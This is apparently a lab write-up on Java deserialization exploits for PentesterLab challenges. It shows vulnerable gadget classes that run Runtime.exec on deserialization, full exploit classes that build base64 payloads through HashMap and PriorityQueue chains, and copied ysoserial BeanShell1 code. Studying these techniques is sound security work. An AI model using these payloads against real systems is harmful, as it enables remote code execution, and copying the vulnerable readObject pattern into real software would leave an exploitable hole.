---
title: "Java Security - Basics"
tags:
  - Java Sec
  - Web
  - Code Review
---

# Java deserialization Basics

# Java Serialize -  02

The technique involving reflection in this context is integral to accessing and modifying the private field **`command`** of the **`AnotherClass`** object.

Reflection in Java allows code to inspect and manipulate classes, interfaces, fields, and methods at runtime. In this exploit:

1. **Accessing Private Field**: The **`Field`** object **`commandField`** is obtained using reflection. This allows access to the private field **`command`** of the **`AnotherClass`** class, which is otherwise inaccessible directly due to its visibility modifier.
2. **Setting Field Value**: The **`setAccessible(true)`** method is called on **`commandField`** to enable access to the private field. Then, the **`set()`** method is used to modify the value of the **`command`** field in the **`gadget`** object. This allows us to inject the desired command to be executed upon deserialization.
3. **Executing Arbitrary Code**: By setting the **`command`** field to the desired command ,we leverage reflection to manipulate the internal state of the object. 
4. During deserialization, when the **`readObject()`** method is invoked, the injected command is executed via **`Runtime.getRuntime().exec()`**, enabling arbitrary code execution on the target system.

```java
ByteArrayOutputStream bos = new ByteArrayOutputStream();   
ObjectOutputStream os = new ObjectOutputStream(bos);   
AnotherClass gadget = new AnotherClass("...");   
os.writeObject(gadget);   
String base64 = Base64.getEncoder().encodeToString(bos.toByteArray());   
System.out.println(base64);[...]
```

source code : 

We have a clear target : **readObject(ObjectInputStream stream)**

```java
package com.pentesterlab;   
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
         
public class AnotherClass implements Serializable {
  
  private String command;
             
  private void readObject(ObjectInputStream stream) throws Exception {
    stream.defaultReadObject();
    Runtime.getRuntime().exec(this.command);
  }  
}
```

solver :

```java
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;

public class Exploit {

    public static void main(String[] args) {
        try {
            AnotherClass gadget = new AnotherClass();

            Field commandField = AnotherClass.class.getDeclaredField("command");
            commandField.setAccessible(true);
            commandField.set(gadget, "/bin/calculator");  
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream os = new ObjectOutputStream(bos);
            os.writeObject(gadget);

            String base64Encoded = Base64.getEncoder().encodeToString(bos.toByteArray());
            System.out.println(base64Encoded);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

## **Java Serialize -  03**

In this challenge, we need to leverage a `java.util.HashMap` that will call the method `hashCode()` when it gets deserialized. 

```java
      Map map = new HashMap<>();
      AnotherClass gadget = new AnotherClass("touch /tmp/pwned");
      map.put(gadget, "pwned");
```

This works because the method `readObject()` of `java.util.HashMap()` calls the method `hash()` on `key` :

```java
private void readObject(ObjectInputStream s)
  throws IOException, ClassNotFoundException
{
  // Read the threshold and loadFactor fields.
  s.defaultReadObject();
  // Read and use capacity, followed by key/value pairs.
  buckets = (HashEntry[]) new HashEntry[s.readInt()];
  int len = s.readInt();
  size = len;
  while (len-- > 0)
    {
      Object key = s.readObject();
      addEntry((K) key, (V) s.readObject(), hash(key), false);
    }
}
```

And the method `hash()` will call `hashCode()` on the `Object` `key`:

```java
package com.pentesterlab;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Exploit {
    public static void main(String[] args) {
        Map map = new HashMap<>();
        AnotherClass gadget = new AnotherClass("touch /tmp/pwned");
        map.put(gadget, "hacked");

        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(map);
            oos.close();
            System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

## java **Serialize** - 04

In this challenge, you need to leverage a `java.util.PriorityQueue` that will call the method `compare()` when it gets deserialized. Your "object generator" should look something like:

```java

      AnotherClass comparator = new AnotherClass();
      PriorityQueue priorityQueue = new PriorityQueue(2, comparator);

```

This works because the method `readObject()` of `java.util.PriorityQueue` calls the method `heapify()`:

```java
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();
     s.readInt();
 
    SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Object[].class, size);
    final Object[] es = queue = new Object[Math.max(size, 1)];
     for (int i = 0, n = size; i < n; i++)
        es[i] = s.readObject();
    heapify();
}
```

The method `heapify()` calls `siftDownUsingComparator()` when a comparator is set. And this method calls the method `compare()` of the conparator (`cmp`):

```java
private static  void siftDownUsingComparator(
        int k, T x, Object[] es, int n, Comparator<? super T> cmp) {
        int half = n >>> 1;
        while (k < half) {
            int child = (k << 1) + 1;
            Object c = es[child];
            int right = child + 1;
            if (right < n && cmp.compare((T) c, (T) es[right]) > 0)
                c = es[child = right];
            if (cmp.compare(x, (T) c) <= 0)
                break;
            es[k] = c;
            k = child;
        }
        es[k] = x;
    }
```

## **Java Serialize - 05**

in this challenge, you need to leverage a `java.util.PriorityQueue` that will call the method `compare()` when it gets deserialized. 

```java
package com.pentesterlab;
import java.io.IOException;
import java.io.Serializable;
import java.util.Comparator;
import java.lang.RuntimeException;

public class AnotherClass implements Comparator, Serializable {
    public int compare(String a, String b) {
        try {
            return Runtime.getRuntime().exec(a).exitValue();
        } catch (Exception e)  {
            throw new RuntimeException("Nope");
        }
    }
}
```

```java
      AnotherClass comparator = new AnotherClass();
      PriorityQueue priorityQueue = new PriorityQueue(2, comparator);
```

There is a small difference with the previous challenge. Here the compare method throws a `RuntimeException` if the command fails during the creation of the gadget. There are two ways to bypass this:

- You can create the right file on your system as a symbolic link for example
- You can use Java to avoid running the command locally (the recommended way to increase how much you learn).

To do this in Java, clone the code of [ysoserial](https://github.com/frohoff/ysoserial) and look at the following files: [`src/main/java/ysoserial/payloads/BeanShell1.java`](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/BeanShell1.java) 

```java
package ysoserial.payloads;

import bsh.Interpreter;
import bsh.XThis;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.Comparator;
import java.util.PriorityQueue;

import ysoserial.Strings;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.util.Reflections;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;

/**
 * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({ "org.beanshell:bsh:2.0b5" })
@Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {

    public PriorityQueue getObject(String command) throws Exception {
	// BeanShell payload

        String payload =
            "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
                Strings.join( // does not support spaces in quotes
                    Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
                    ",", "\"", "\"") +
                "}).start();return new Integer(1);}";

	// Create Interpreter
	Interpreter i = new Interpreter();

	// Evaluate payload
	i.eval(payload);

	// Create InvocationHandler
	XThis xt = new XThis(i.getNameSpace(), i);
	InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);

	// Create Comparator Proxy
	Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

	// Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
	final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
	Object[] queue = new Object[] {1,1};
	Reflections.setFieldValue(priorityQueue, "queue", queue);
	Reflections.setFieldValue(priorityQueue, "size", 2);

	return priorityQueue;
    }

    public static void main(final String[] args) throws Exception {
	PayloadRunner.run(BeanShell1.class, args);
    }
}
```

and [`src/main/java/ysoserial/payloads/util/Reflections.java`](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/util/Reflections.java). 

```java
package ysoserial.payloads.util;

import java.lang.reflect.AccessibleObject;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

import sun.reflect.ReflectionFactory;

import com.nqzero.permit.Permit;

@SuppressWarnings ( "restriction" )
public class Reflections {

    public static void setAccessible(AccessibleObject member) {
        String versionStr = System.getProperty("java.version");
        int javaVersion = Integer.parseInt(versionStr.split("\\.")[0]);
        if (javaVersion < 12) {
          // quiet runtime warnings from JDK9+
          Permit.setAccessible(member);
        } else {
          // not possible to quiet runtime warnings anymore...
          // see https://bugs.openjdk.java.net/browse/JDK-8210522
          // to understand impact on Permit (i.e. it does not work
          // anymore with Java >= 12)
          member.setAccessible(true);
        }
    }

	public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
	try {
	    field = clazz.getDeclaredField(fieldName);
	    setAccessible(field);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
		return field;
	}

	public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
		final Field field = getField(obj.getClass(), fieldName);
		field.set(obj, value);
	}

	public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
		final Field field = getField(obj.getClass(), fieldName);
		return field.get(obj);
	}

	public static Constructor<?> getFirstCtor(final String name) throws Exception {
		final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
	    setAccessible(ctor);
	    return ctor;
	}

	public static Object newInstance(String className, Object ... args) throws Exception {
        return getFirstCtor(className).newInstance(args);
    }

    public static <T> T createWithoutConstructor ( Class<T> classToInstantiate )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }

    @SuppressWarnings ( {"unchecked"} )
    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
	    setAccessible(objCons);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
	    setAccessible(sc);
        return (T)sc.newInstance(consArgs);
    }

}
```

These files should give you everything we need to create a `java.util.PriorityQueue` with the malicious elements in it with running the `compare()` method locally.
****The AnotherClass is a custom comparator that implements both Comparator and Serializable interfaces. It has a compare(String a, String b) method that tries to execute the command provided in the string a and returns the exit value of the command. If the command execution fails, it throws a RuntimeException.
****The Exploit class creates a PriorityQueue with AnotherClass as the comparator, adds two String objects to the queue to ensure compare() is called during deserialization, serializes the queue to a byte array, and then encodes the byte array to a base64 string.

```java
package com.pentesterlab;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.PriorityQueue;

public class Exploit {
    public static void main(String[] args) throws IOException {
        AnotherClass comparator = new AnotherClass();
        PriorityQueue<String> priorityQueue = new PriorityQueue<>(2, comparator);
        priorityQueue.add("touch /tmp/pwned");
        priorityQueue.add("touch /tmp/pwned");

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(priorityQueue);
        oos.close();

        String base64Queue = Base64.getEncoder().encodeToString(baos.toByteArray());
        System.out.println(base64Queue);
    }
}
```

# Tools & References:
- ysoserial: A popular tool used to generate Java deserialization payloads.
- Reflection Utilities: For exploiting private fields and methods during deserialization.